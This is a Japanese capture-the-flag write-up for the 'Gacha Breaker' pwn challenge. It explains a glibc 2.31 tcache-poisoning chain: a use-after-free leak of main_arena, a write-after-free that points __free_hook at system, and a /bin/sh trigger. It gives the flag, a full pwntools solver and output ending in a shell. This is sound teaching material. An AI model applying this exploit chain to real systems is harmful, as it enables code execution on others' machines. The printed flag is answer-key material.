# Gacha Breaker

## 問題文

このガチャゲームでは確率操作で重複した結果が出る確率を上げています。
秘密のFLAGを取って困らせましょう。

`nc gacha.pwn.wanictf.org 9008`

## FLAG

`FLAG{G4ch4_15_3v1l_bu7_c4n7_5t0p}`

## 解法

### Tcache Poisoning libc 2.31
libc 2.31ではzero countをcheckする。
つまりbinに記録されている数だけがmallocが可能でその後はfd_pointerがあっても無視されます。
そこを気を付けながらArbitrary WriteとRead、libc_address leakで__free_hookを書き換える。


基本的にはhistoryをclearしてもhistoryのarrayはいっぱいになるまでclearされないことで、freeされたブロックのアドレスが残っていることからすべてが始まります。

### get the libc address
このガチャでは重複の確率を高めるために2回前のガチャの結果の頭の部分を必ず混ぜている。
しかし、前回のガチャを参照するときFreeされているかは確認してないためlibc addressをゲットすることができる。
unsorted binの両端のfree chunkからmain_arenaのアドレスがリークされるので計算ができる。
```
//コードがぐちゃぐちゃで申し訳ございませんでした。
for(int i=prob_man;i<k;i++){　
		if(n>1 && count[n-2]>3)　
			gacha_result[i]=list[n-2][k-i-1];
		else
			gacha_result[i]=rand()%0x10000;
		printf(" [%#x]",gacha_result[i]);
	}
```
tcacheではfree chunkにlibcの情報がないがここではhistoryを7個まで記録するため、tcachebinsのサイズの範囲では必ずtcachebinsに入る。
そこでfreeされてもtcachebinsに入らずunsorted binへ入るサイズのchunkが必要となる。
でもunsorted binはtop chunkと接してfreeされるとtop chunkにmerge(合併)される。
top chunkにmergeされるのを防ぐために0x408より大きいchunkの上にもう一つのchunkでtopchunkと分離する。

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x291

Free chunk (tcache) | PREV_INUSE
Addr: 0x555555559290
Size: 0x1a1
fd: 0x555555559440

Free chunk (tcache) | PREV_INUSE
Addr: 0x555555559430
Size: 0x1a1
fd: 0x00

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5555555595d0
Size: 0x4c1
fd: 0x7ffff7faebe0
bk: 0x7ffff7faebe0

Free chunk (tcache)
Addr: 0x555555559a90
Size: 0x330
fd: 0x00

Top chunk | PREV_INUSE
Addr: 0x555555559dc0
Size: 0x20241
```


この状態でlistをfreeさせ、tcachebinsにあるサイズ(違うと、unsortedbinにあるchunkからchunkを獲得してしまう。)でガチャをまわすとunsorted binのfree chunkが読まれて、main_arena+96のアドレスが確認できる。
これより__free_hookとsystemのアドレスを確保する。

### Aribtrary write
Ceilingを利用する。 Ceilingではガチャで天井に行った場合、一つの値を自分が欲しい値に変えられる。
しかし、ここにもfreeされた部分に対する確認がなく、freeされてもcountは残っているため Write after freeがある。
ceilingではtcache_perthread_structに直接書くことができないためすでにfreeされているtcachebinsのchunkのfd_pointerを書き換える。
この書き換えられたポインターにchunkを当てるには二つのchunkが必要。
最初のmallocでtcache_perthread_structに書かれているアドレスにchunkを当てて、その次に書き換えたアドレスにchunkが当てられる。
そのため予め2つのchunkをmallocする必要がある。

### 最終的な動作順番

- malloc(size a)-malloc(size a)-malloc(size for unsorted bin)-malloc(size b)
- free_list
- malloc(size b) : Get the main_arena address and caculate__free_hook and system
- Ceiling x 2 : freeされたsize aのchunkのfd_pointerを__free_hookにする。 int形であるため合計2回の操作が必要
- malloc(size c) * 2 ： このままだとHistoryがfullになって途中で全部初期化されるので予め初期化する。
- malloc(size a)-malloc(size a) : 後のmallocは__free_hookにmallocされる。
- Ceiling x 2 :Ceilingで__free_hookのchunkにsystemのアドレスを入れる。
- malloc(size d) : /bin/shを書くためのchunk. Ceilingで/bin/shをhexで書く。
- size dのchunkをfreeする

### Solverのコードと結果
```
from pwn import *

def gacha(n):
	pc.sendlineafter(">","1")
	pc.sendlineafter(":",str(n))
	result=pc.recvline_endswith(']')
	print('==Gacha {} times=='.format(n))
	return result

def clear():
	pc.sendlineafter(">","3")
	print('==Cleared==')

def ceiling(no,a,target):
	#padding target
	target=str(target)
	target=target[:2]+'0'*(18-len(target))+target[2:]
	print(target)

	temp='0x'+target[-8:] #as is processd by int, get 4bytes of _free_hook address
	print(temp)
	pc.sendlineafter(">","4")
	pc.sendlineafter(">",str(no))
	pc.sendlineafter(">",str(a))
	pc.sendlineafter(">",str(int(temp,16)))

	temp=target[-18:-8] #as is processd by int, get 4bytes with 0x of _free_hook address
	print(temp)
	pc.sendlineafter(">","4")
	pc.sendlineafter(">",str(no))
	pc.sendlineafter(">",str(a+1))
	pc.sendlineafter(">",str(int(temp,16)))
	print("==Write {}-{} as {}==".format(no,a,target))

pc=connect('localhost',9102)
#pc=process('./chall')

libc=ELF('./libc-2.31.so')

print("\n=====Leaking libc address=====")
gacha(100)
gacha(100) #To avoid zero count check
gacha(500)
gacha(200)
clear()

libc_raw = gacha(200)[-21:] # Read after free
#processing returned libc address
libc_leak =libc_raw[1:7]+libc_raw[12:-1]
libc_leak=libc_leak.decode("utf-8")
libc_leak=int(libc_leak,16)

#calculating address
libc_base = libc_leak-0x1ebbe0
free_hook = hex(libc_base+libc.symbols['__free_hook'])
system = hex(libc_base+libc.symbols['system'])

print("\n=====Result=====")
print('libc_leak <main_arena+96> : ',hex(libc_leak))
print('libc_base :',hex(libc_base))
print('__free_hook :',free_hook)
print('system :',system)

print("\n=====Preparing writing at __free_hook=====")
ceiling(0,0,free_hook)

print("\n=====Reset history before malloc at __free_hook=====")
gacha(10)
gacha(10)

print("\n=====Malloc at __free_hook=====")
gacha(100)
gacha(100) # at __free_hook

print("\n=====Writing system at __free_hook=====")
ceiling(1,0,system)

print("\n=====Writing /bin/sh for free hook=====")

binsh="0x" #Write binsh in hex, little endian
for a in "/bin/sh"[::-1]:
	binsh+=str(hex(ord(a)))[2:]

gacha(2)
ceiling(2,0,hex(int(binsh,16)))
print("\n=====Shelllllllllllllll=====")
clear()
pc.interactive()
```

```

=====Leaking libc address=====
==Gacha 100 times==
==Gacha 100 times==
==Gacha 500 times==
==Gacha 200 times==
==Cleared==
==Gacha 200 times==

=====Result=====
libc_leak <main_arena+96> :  0x7f64fee39be0
libc_base : 0x7f64fec4e000
__free_hook : 0x7f64fee3cb28
system : 0x7f64feca3410

=====Preparing writing at __free_hook=====
0x00007f64fee3cb28
0xfee3cb28
0x00007f64
==Write 0-0 as 0x00007f64fee3cb28==

=====Reset history before malloc at __free_hook=====
==Gacha 10 times==
==Gacha 10 times==

=====Malloc at __free_hook=====
==Gacha 100 times==
==Gacha 100 times==

=====Writing system at __free_hook=====
0x00007f64feca3410
0xfeca3410
0x00007f64
==Write 1-0 as 0x00007f64feca3410==

=====Writing /bin/sh for free hook=====
==Gacha 2 times==
0x0068732f6e69622f
0x6e69622f
0x0068732f
==Write 2-0 as 0x0068732f6e69622f==

=====Shelllllllllllllll=====
==Cleared==
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
```
